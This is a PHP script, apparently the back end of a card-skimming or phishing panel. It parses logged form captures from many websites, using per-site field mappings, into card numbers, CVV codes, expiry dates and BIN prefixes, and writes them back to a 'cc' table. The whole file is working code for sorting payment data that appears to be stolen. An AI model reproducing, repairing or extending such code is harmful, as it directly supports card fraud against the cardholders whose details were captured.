<?php
require 'config.php'; 

function formatExpirationDate($date) {
    $date = preg_replace('/\s+/', '', $date);
    
    if (preg_match('/^(\d{1,2})-[a-zA-Z]+$/', $date, $matches)) {
        $month = $matches[1];
        return "$month";
    }
    
    if (preg_match('/^(\d{2})(\d{2})(\d{2})?$/', $date, $matches)) {
        $month = $matches[1];
        $year = isset($matches[3]) ? $matches[2] . $matches[3] : $matches[2];
        return "$month/$year";
    }
    
    return $date;
}

function formatExpirationDates($dates) {
    $formattedDates = [];
    $dateArray = explode(',', $dates);
    
    foreach ($dateArray as $date) {
        $date = trim($date);
        $formattedDates[] = formatExpirationDate($date);
    }
    
    return implode(', ', $formattedDates);
}

function extractValuesFromDataLog($dataLog, $mappings) {
    $dataLogArray = json_decode($dataLog);
    $extractedValues = [];

    if (!is_array($dataLogArray)) {
        return $extractedValues;
    }

    foreach ($mappings as $fieldKey => $assignAs) {
        foreach ($dataLogArray as $item) {
            $parts = explode(':', $item, 2);
            if (count($parts) == 2) {
                list($key, $value) = $parts;
                if ($key == $fieldKey) {
                    if ($assignAs == 'payment_cc_cid') {
                        // Проверяем, содержит ли значение 3 или 4 цифры
                        if (!preg_match('/^\d{3,4}$/', $value)) {
                            continue; // Пропускаем значение, если оно не соответствует требованиям
                        }
                    }
                    
                    if (!isset($extractedValues[$assignAs])) {
                        $extractedValues[$assignAs] = $value;
                    } else {
                        $existingValues = explode(', ', $extractedValues[$assignAs]);
                        if (!in_array($value, $existingValues)) {
                            $extractedValues[$assignAs] .= ', ' . $value;
                        }
                    }
                }
            }
        }
    }

    return $extractedValues;
}

$mappingResult = $db->query("SELECT * FROM field_mappings WHERE block IS NULL");
$mappings = [];
while ($mappingRow = $mappingResult->fetch_assoc()) {
    $mappings[$mappingRow['url_id']][$mappingRow['field_key']] = $mappingRow['assign_as'];
}

$result = $db->query("SELECT * FROM cc");
while ($row = $result->fetch_assoc()) {
    if (isset($mappings[$row['url_id']])) {
        $extractedValues = extractValuesFromDataLog($row['fulldatalog'], $mappings[$row['url_id']]);
        
        
        if (isset($extractedValues['payment_cc_exp_month'])) {
            $extractedValues['payment_cc_exp_month'] = formatExpirationDates($extractedValues['payment_cc_exp_month']);
        }
        
        $updateParts = [];
        foreach ($extractedValues as $key => $value) {
            $updateParts[] = "`$key` = '" . $db->real_escape_string($value) . "'";
        }

        if (count($updateParts) > 0) {
            $updateQuery = "UPDATE cc SET " . implode(", ", $updateParts) . " WHERE id = " . $row['id'];
            $db->query($updateQuery);
        }
		if (isset($extractedValues['payment_cc_number'])) {
    $ccNumbers = explode(', ', $extractedValues['payment_cc_number']);
    $types = [];

    foreach ($ccNumbers as $ccNumber) {
        $ccNumber = preg_replace('/\s+/', '', $ccNumber);
        if (preg_match('/^\d{6}/', $ccNumber, $matches)) {
            $types[] = $matches[0];
        }
    }

    if (!empty($types)) {
        $type = implode(', ', $types);
        $updateTypeQuery = "UPDATE cc SET `type` = '" . $db->real_escape_string($type) . "' WHERE id = " . $row['id'];
        $db->query($updateTypeQuery);
    }
}
    }
}

$db->close();